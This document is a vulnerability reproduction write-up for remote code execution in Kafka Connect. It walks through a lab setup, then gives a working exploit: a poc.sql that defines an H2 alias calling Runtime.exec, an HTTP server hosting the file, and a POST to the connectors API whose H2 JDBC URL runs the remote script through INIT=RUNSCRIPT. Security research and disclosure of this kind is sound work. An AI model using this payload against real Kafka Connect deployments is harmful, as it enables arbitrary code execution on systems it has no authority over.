

## H2 JDBC Deserialization Vulnerability Causes Arbitrary Code Execution In Kafka Connect

Download the latest version of kafka from the official website and decompress it：

![image-20230804211601546](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804211601546.png)

After decompression, as shown in the figure below：

![image-20230804211732233](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804211732233.png)

Configure kafka using the following command：

```
$ vim config/server.properties
```

The modified server.properties file is as follows：

```
# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements.  See the NOTICE file distributed with
# this work for additional information regarding copyright ownership.
# The ASF licenses this file to You under the Apache License, Version 2.0
# (the "License"); you may not use this file except in compliance with
# the License.  You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#
# This configuration file is intended for use in ZK-based mode, where Apache ZooKeeper is required.
# See kafka.server.KafkaConfig for additional details and defaults
#

############################# Server Basics #############################

# The id of the broker. This must be set to a unique integer for each broker.
broker.id=0

############################# Socket Server Settings #############################

# The address the socket server listens on. If not configured, the host name will be equal to the value of
# java.net.InetAddress.getCanonicalHostName(), with PLAINTEXT listener name, and port 9092.
#   FORMAT:
#     listeners = listener_name://host_name:port
#   EXAMPLE:
#     listeners = PLAINTEXT://your.host.name:9092
listeners=PLAINTEXT://:9092

# Listener name, hostname and port the broker will advertise to clients.
# If not set, it uses the value for "listeners".
#advertised.listeners=PLAINTEXT://your.host.name:9092

# Maps listener names to security protocols, the default is for them to be the same. See the config documentation for more details
#listener.security.protocol.map=PLAINTEXT:PLAINTEXT,SSL:SSL,SASL_PLAINTEXT:SASL_PLAINTEXT,SASL_SSL:SASL_SSL

# The number of threads that the server uses for receiving requests from the network and sending responses to the network
num.network.threads=3

# The number of threads that the server uses for processing requests, which may include disk I/O
num.io.threads=8

# The send buffer (SO_SNDBUF) used by the socket server
socket.send.buffer.bytes=102400

# The receive buffer (SO_RCVBUF) used by the socket server
socket.receive.buffer.bytes=102400

# The maximum size of a request that the socket server will accept (protection against OOM)
socket.request.max.bytes=104857600


############################# Log Basics #############################

# A comma separated list of directories under which to store log files
log.dirs=/tmp/kafka-logs

# The default number of log partitions per topic. More partitions allow greater
# parallelism for consumption, but this will also result in more files across
# the brokers.
num.partitions=1

# The number of threads per data directory to be used for log recovery at startup and flushing at shutdown.
# This value is recommended to be increased for installations with data dirs located in RAID array.
num.recovery.threads.per.data.dir=1

############################# Internal Topic Settings  #############################
# The replication factor for the group metadata internal topics "__consumer_offsets" and "__transaction_state"
# For anything other than development testing, a value greater than 1 is recommended to ensure availability such as 3.
offsets.topic.replication.factor=1
transaction.state.log.replication.factor=1
transaction.state.log.min.isr=1

############################# Log Flush Policy #############################

# Messages are immediately written to the filesystem but by default we only fsync() to sync
# the OS cache lazily. The following configurations control the flush of data to disk.
# There are a few important trade-offs here:
#    1. Durability: Unflushed data may be lost if you are not using replication.
#    2. Latency: Very large flush intervals may lead to latency spikes when the flush does occur as there will be a lot of data to flush.
#    3. Throughput: The flush is generally the most expensive operation, and a small flush interval may lead to excessive seeks.
# The settings below allow one to configure the flush policy to flush data after a period of time or
# every N messages (or both). This can be done globally and overridden on a per-topic basis.

# The number of messages to accept before forcing a flush of data to disk
#log.flush.interval.messages=10000

# The maximum amount of time a message can sit in a log before we force a flush
#log.flush.interval.ms=1000

############################# Log Retention Policy #############################

# The following configurations control the disposal of log segments. The policy can
# be set to delete segments after a period of time, or after a given size has accumulated.
# A segment will be deleted whenever *either* of these criteria are met. Deletion always happens
# from the end of the log.

# The minimum age of a log file to be eligible for deletion due to age
log.retention.hours=168

# A size-based retention policy for logs. Segments are pruned from the log unless the remaining
# segments drop below log.retention.bytes. Functions independently of log.retention.hours.
#log.retention.bytes=1073741824

# The maximum size of a log segment file. When this size is reached a new log segment will be created.
#log.segment.bytes=1073741824

# The interval at which log segments are checked to see if they can be deleted according
# to the retention policies
log.retention.check.interval.ms=300000

############################# Zookeeper #############################

# Zookeeper connection string (see zookeeper docs for details).
# This is a comma separated host:port pairs, each corresponding to a zk
# server. e.g. "127.0.0.1:3000,127.0.0.1:3001,127.0.0.1:3002".
# You can also append an optional chroot string to the urls to specify the
# root directory for all kafka znodes.
zookeeper.connect=localhost:2181

# Timeout in ms for connecting to zookeeper
zookeeper.connection.timeout.ms=18000


############################# Group Coordinator Settings #############################

# The following configuration specifies the time, in milliseconds, that the GroupCoordinator will delay the initial consumer rebalance.
# The rebalance will be further delayed by the value of group.initial.rebalance.delay.ms as new members join the group, up to a maximum of max.poll.interval.ms.
# The default value for this is 3 seconds.
# We override this to 0 here as it makes for a better out-of-the-box experience for development and testing.
# However, in production environments the default value of 3 seconds is more suitable as this will help to avoid unnecessary, and potentially expensive, rebalances during application startup.
group.initial.rebalance.delay.ms=0
```

Then start zookeeper:

```
$ bin/zookeeper-server-start.sh config/zookeeper.properties
```

Open a new terminal and run kafka：

```
$ cd ~/Dev/kafka_2.13-3.5.1/
$ bin/kafka-server-start.sh config/server.properties
```

Then configure kafka Connect,Download the JDBC Connector compressed package from https://www.confluent.io/hub/confluentinc/kafka-connect-jdbc：

![image-20230804212856601](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804212856601.png)

Open a new terminal,Create a connector-libs directory in the root directory of kafka, then decompress the zip package just downloaded, and move the lib directory under the root directory of the decompressed package to the connector-libs directory：

```
$ cd ~/Dev/kafka_2.13-3.5.1/
$ mkdir connector-libs 
$ unzip ~/Downloads/confluentinc-kafka-connect-jdbc-10.7.3.zip
$ mv ./confluentinc-kafka-connect-jdbc-10.7.3/lib connector-libs/
```

Download the h2 JDBC jar package from the maven official website, and put it in the lib directory under connector-libs：

![image-20230804213805768](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804213805768.png)

```
$ mv ~/Downloads/h2-1.4.199.jar ~/Dev/kafka_2.13-3.5.1/connector-libs/lib/
```

Configure connect-standalone.properties, add plugin.path：

```
$ vim config/connect-standalone.properties
```

Add the following to the last line of the file：

```
plugin.path=/Library/Java/JavaVirtualMachines/jdk1.8.0_111.jdk/Contents/Home,/Users/zeanhike/Dev/kafka_2.13-3.5.1/connector-libs/lib
```

Export  h2-1.4.199.jar to the CLASSPATH environment variable:

![image-20230804214611662](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804214611662.png)

Start Kafka Connect：

```
$ bin/connect-standalone.sh config/connect-standalone.properties 
```

Create a SQL file with the following content and save it as poc.sql：

```
CREATE ALIAS EXEC_CMD AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "zeanhike";}';CALL EXEC_CMD ('open -a Calculator.app')
```

Then start an HTTP service and place the poc.sql file in the root directory of the http service：

```
$ python3 -m http.server 1022
```

Then send the following request packet:

```
POST http://localhost:8083/connectors
Content-Type: application/json

{
  "name": "zeanhike",
  "config": {
    "connector.class": "io.confluent.connect.jdbc.JdbcSourceConnector",
    "connection.url": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1022/poc.sql",
    "connection.user": "zeanhike",
    "connection.password": "zeanhike",
    "topic.prefix": "mysql-01-",
    "mode":"bulk"
  }
}
```

![image-20230804220908380](https://raw.githubusercontent.com/CyberIKUN/picture/main/img/image-20230804220908380.png)
